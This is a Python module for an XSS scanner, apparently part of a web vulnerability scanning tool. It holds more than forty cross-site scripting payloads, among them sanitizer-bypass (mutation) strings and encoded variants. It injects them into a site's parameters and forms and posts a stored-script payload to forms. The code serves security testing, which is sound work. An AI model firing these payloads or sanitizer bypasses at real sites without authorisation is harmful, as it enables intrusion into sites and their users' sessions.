"""
XSS (Cross-Site Scripting) Scanner — Industrial-Grade Multi-Signal Detection.

Detection methods:
1. Reflected XSS via parameter injection with unique canary (30+ payloads)
   - SVG animate/set, MathML, iframe srcdoc, embed, marquee
   - Video/audio onerror, polyglots, mixed case, backtick variants
2. Mutation XSS payloads (DOMPurify/sanitizer bypasses)
3. Encoding-based XSS (HTML entities, fromCharCode, atob)
4. Form-based reflected XSS
5. Stored XSS detection (submit form, re-fetch page)
6. DOM-based XSS with deeper source-to-sink analysis

Anti-false-positive measures:
- Canary-based: uses unique random prefix to avoid matching existing content
- Context-aware: checks if reflection is in executable HTML context
- Content-Type validation: only flags text/html responses
- Baseline comparison: ignores payloads already present in page
- WAF detection: skips blocked responses
"""

import random
import string
import re
from core.http_client import get
from core.config import ScannerConfig
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding, is_in_executable_context,
)
from core.utils import inject_into_params, get_forms, submit_form

CANARY = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

# ── Reflected XSS payloads (30+) ──
PAYLOADS = [
    # Classic script tag variants
    f'{CANARY}<script>alert(1)</script>',
    f'{CANARY}"><script>alert(1)</script>',
    f"{CANARY}'><script>alert(1)</script>",
    f'{CANARY}<ScRiPt>alert(1)</ScRiPt>',
    # Event handlers
    f'{CANARY}" onmouseover="alert(1)"',
    f'{CANARY}" onfocus="alert(1)" autofocus="',
    f'{CANARY}" onload="alert(1)"',
    # Image onerror
    f'{CANARY}"><img src=x onerror=alert(1)>',
    f'{CANARY}<img src=x onerror=alert`1`>',
    f'{CANARY}<img/src=x onerror=alert(1)//>',
    # SVG variants
    f'{CANARY}"><svg/onload=alert(1)>',
    f"{CANARY}'><svg onload=alert(1)>",
    f'{CANARY}<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    f'{CANARY}<svg><set onbegin=alert(1) attributeName=x to=1>',
    f'{CANARY}<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
    # MathML
    f'{CANARY}<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    f'{CANARY}<math><mi><table><mglyph><style><img src=x onerror=alert(1)>',
    # iframe srcdoc
    f'{CANARY}"><iframe srcdoc="<script>alert(1)</script>">',
    f'{CANARY}<iframe src="javascript:alert(1)">',
    # Embed / Object
    f'{CANARY}<embed src="javascript:alert(1)">',
    f'{CANARY}<object data="javascript:alert(1)">',
    # Marquee
    f'{CANARY}<marquee onstart=alert(1)>',
    # Video/Audio onerror
    f'{CANARY}<video><source onerror=alert(1)>',
    f'{CANARY}<audio src=x onerror=alert(1)>',
    f'{CANARY}<video src=x onerror=alert(1)>',
    # Details/Input/Body
    f'{CANARY}<details open ontoggle=alert(1)>',
    f'{CANARY}<input autofocus onfocus=alert(1)>',
    f'{CANARY}<body onload=alert(1)>',
    # JavaScript context breakout
    f"{CANARY}';alert(1)//",
    f'{CANARY}";alert(1)//',
    # Polyglots
    f"{CANARY}jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik%0telerik/telerik/oN/telerik/src=\"data:text/html,<svg onload=alert(1)>\"",
    f'{CANARY}"><img src=x onerror=alert(1)//><svg/onload=alert(1)//>',
]

# ── Mutation XSS payloads (DOMPurify/sanitizer bypasses) ──
MUTATION_PAYLOADS = [
    f'{CANARY}<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    f'{CANARY}<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    f'{CANARY}<form><math><mtext><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">',
    f'{CANARY}<svg></p><style><g/onload=alert(1)>',
    f'{CANARY}<a id="x"><b id="y"><select><style></select><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)//">',
]

# ── Encoding-based XSS payloads ──
ENCODING_PAYLOADS = [
    # HTML entity encoding
    f'{CANARY}&#60;script&#62;alert(1)&#60;/script&#62;',
    f'{CANARY}&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
    # String.fromCharCode
    f'{CANARY}"><img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    # atob (base64)
    f'{CANARY}"><img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    # Unicode escapes
    f'{CANARY}<script>\\u0061lert(1)</script>',
    # Data URI
    f'{CANARY}<a href="data:text/html,<script>alert(1)</script>">click</a>',
]

# ── DOM XSS sinks and sources (expanded) ──
DOM_SINKS = [
    'document.write(', 'document.writeln(',
    '.innerHTML', '.outerHTML',
    'eval(', 'setTimeout(', 'setInterval(',
    'document.location', 'window.location',
    'Function(', 'execScript(',
    '.insertAdjacentHTML', 'document.execCommand(',
    'jQuery.html(', '$.html(', '.append(',
    'postMessage(', 'createContextualFragment(',
    'Range.createContextualFragment(',
    'document.domain', 'element.setAttribute(',
]

DOM_SOURCES = [
    'location.hash', 'location.search', 'document.URL',
    'document.referrer', 'window.name',
    'location.href', 'location.pathname',
    'document.cookie', 'document.baseURI',
    'window.location.hash', 'window.location.search',
    'postMessage', 'localStorage.getItem(',
    'sessionStorage.getItem(', 'document.documentURI',
    'URLSearchParams(',
]

# ── jQuery-specific sinks ──
JQUERY_SINKS = [
    '.html(', '.append(', '.prepend(', '.after(', '.before(',
    '.replaceWith(', '.wrap(', '.wrapAll(', '.wrapInner(',
]


def test_xss(url):
    baseline = get_baseline(url, get)

    # ── 1. Param-based reflected XSS ──
    for payload in PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)

                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                ct = r.headers.get("Content-Type", "").lower()
                if "text/html" not in ct and "text/xml" not in ct:
                    continue

                if CANARY not in r.text:
                    continue

                if payload not in r.text:
                    continue

                if payload in baseline["text"]:
                    continue

                if not is_in_executable_context(payload, r.text):
                    continue  # Safely escaped or in non-executable context -> False positive

                signals = {
                    "reflection": True,
                    "reflection_context": True,
                    "response_diff": diff_responses(baseline["text"], r.text) < 0.95,
                    "verified": True,
                }

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_CONFIRMED:
                    return make_finding(
                        url, "XSS (Reflected)", confidence, signals,
                        details=f"Unescaped payload reflected in executable context via param '{param}'",
                        severity="High", payload=payload, parameter=param,
                        evidence=payload[:80],
                    )
            except Exception:
                continue

    # ── 2. Mutation XSS payloads ──
    for payload in MUTATION_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                ct = r.headers.get("Content-Type", "").lower()
                if "text/html" not in ct:
                    continue

                if CANARY not in r.text:
                    continue

                # For mutation XSS, check if any part of the dangerous payload survived in executable context
                if not is_in_executable_context(payload, r.text):
                    continue

                dangerous_parts = ["onerror=alert", "onload=alert", "<script>", "<img src=x"]
                reflected_dangerous = any(part in r.text for part in dangerous_parts)

                if not reflected_dangerous:
                    continue

                if payload in baseline["text"]:
                    continue

                signals = {
                    "reflection": True,
                    "waf_evasion_success": True,
                    "response_diff": diff_responses(baseline["text"], r.text) < 0.95,
                }

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "XSS (Mutation/Sanitizer Bypass)", confidence, signals,
                        details=f"Mutation XSS payload survived sanitization in param '{param}'",
                        severity="High", payload=payload[:100], parameter=param,
                        evidence=payload[:80],
                    )
            except Exception:
                continue

    # ── 3. Encoding-based XSS ──
    for payload in ENCODING_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                ct = r.headers.get("Content-Type", "").lower()
                if "text/html" not in ct:
                    continue

                if CANARY not in r.text:
                    continue

                if payload not in r.text:
                    continue

                if payload in baseline["text"]:
                    continue

                signals = {
                    "reflection": True,
                    "waf_evasion_success": True,
                    "response_diff": diff_responses(baseline["text"], r.text) < 0.95,
                }

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "XSS (Encoding-Based)", confidence, signals,
                        details=f"Encoded payload reflected in param '{param}'",
                        severity="High", payload=payload[:100], parameter=param,
                        evidence=payload[:80],
                    )
            except Exception:
                continue

    # ── 4. Form-based reflected XSS ──
    forms = get_forms(url)
    for form in forms:
        for payload in PAYLOADS[:10]:
            try:
                r = submit_form(form, url, payload)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                ct = r.headers.get("Content-Type", "").lower()
                if "text/html" not in ct:
                    continue

                if payload not in r.text or payload in baseline["text"]:
                    continue

                signals = {
                    "reflection": True,
                    "response_diff": diff_responses(baseline["text"], r.text) < 0.95,
                }

                if is_in_executable_context(payload, r.text):
                    signals["reflection_context"] = True

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "XSS (Reflected via Form)", confidence, signals,
                        details="Payload reflected after form submission",
                        severity="High", payload=payload, evidence=payload[:80],
                    )
            except Exception:
                continue

    # ── 5. Stored XSS detection (submit form, then re-fetch page) ──
    for form in forms:
        stored_payload = f'{CANARY}<script>alert("stored")</script>'
        try:
            submit_form(form, url, stored_payload)
            # Re-fetch the original page to see if payload is now stored
            r_refetch = get(url)
            if stored_payload in r_refetch.text and stored_payload not in baseline["text"]:
                signals = {
                    "reflection": True,
                    "reflection_context": True,
                    "verified": True,
                }
                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "XSS (Stored)", confidence, signals,
                        details="Payload persisted after form submission and page re-fetch",
                        severity="Critical", payload=stored_payload,
                        evidence=stored_payload[:80],
                    )
        except Exception:
            continue

    # ── 6. DOM-based XSS pattern detection (deeper analysis) ──
    try:
        page_text = baseline["text"]

        # Check for source-to-sink flows
        found_sources = []
        found_sinks = []

        for src in DOM_SOURCES:
            if src in page_text:
                found_sources.append(src)

        for sink in DOM_SINKS:
            if sink in page_text:
                found_sinks.append(sink)

        # Look for proximity-based source-to-sink patterns
        for sink in found_sinks:
            for src in found_sources:
                # Find all occurrences
                src_positions = [m.start() for m in re.finditer(re.escape(src), page_text)]
                sink_positions = [m.start() for m in re.finditer(re.escape(sink), page_text)]

                for src_pos in src_positions:
                    for sink_pos in sink_positions:
                        # Source should flow to sink (source comes before sink, within 500 chars)
                        if 0 <= (sink_pos - src_pos) <= 500:
                            signals = {
                                "reflection": True,
                                "behavioral_anomaly": True,
                            }
                            confidence = calculate_confidence(signals)
                            if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                                return make_finding(
                                    url, "XSS (DOM-Based Potential)", confidence, signals,
                                    details=f"DOM source '{src}' flows to sink '{sink}' (distance: {sink_pos - src_pos} chars)",
                                    severity="Medium", evidence=f"{src} -> {sink}",
                                )

        # Check jQuery-specific sinks with DOM sources
        for sink in JQUERY_SINKS:
            if sink in page_text:
                for src in found_sources:
                    src_positions = [m.start() for m in re.finditer(re.escape(src), page_text)]
                    sink_positions = [m.start() for m in re.finditer(re.escape(sink), page_text)]
                    for src_pos in src_positions:
                        for sink_pos in sink_positions:
                            if 0 <= (sink_pos - src_pos) <= 800:
                                signals = {
                                    "reflection": True,
                                    "behavioral_anomaly": True,
                                }
                                confidence = calculate_confidence(signals)
                                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                                    return make_finding(
                                        url, "XSS (DOM-Based jQuery Sink)", confidence, signals,
                                        details=f"jQuery sink '{sink}' with source '{src}'",
                                        severity="Medium", evidence=f"{src} -> jQuery{sink}",
                                    )
    except Exception:
        pass

    return None
